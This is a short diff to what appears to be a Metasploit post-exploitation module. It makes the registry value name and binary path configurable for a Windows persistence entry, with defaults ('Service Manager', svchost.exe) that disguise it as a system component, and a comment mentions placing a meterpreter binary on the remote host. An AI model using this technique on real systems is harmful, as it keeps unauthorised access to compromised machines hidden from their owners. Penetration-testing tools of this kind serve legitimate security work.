@@ -33,6 +33,8 @@ class Metasploit3 < Msf::Post
 		register_options(
 			[
 				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
+				OptString.new('TASKNAME', [false, 'Binary to run', 'Service Manager']),
+				OptString.new('BINARY', [false, 'Binary to run', 'C:\\windows\\system32\\svchost.exe']),
                                 OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
 			], self.class)
 
@@ -51,9 +53,9 @@ class Metasploit3 < Msf::Post
 		else
 			type = "REG_SZ"
 			## this is the hard part -- how to gen a meterpreter binary & stick it on the remote host?
-			executable = "C:\\windows\\system32\\systray.exe"
+			executable = datastore['BINARY']
 			migrate
-			val_name = "Whee"
+			val_name = datastore['TASKNAME']
 			data = executable
 
 			registry_setvaldata(reg_key, val_name, executable, type)	
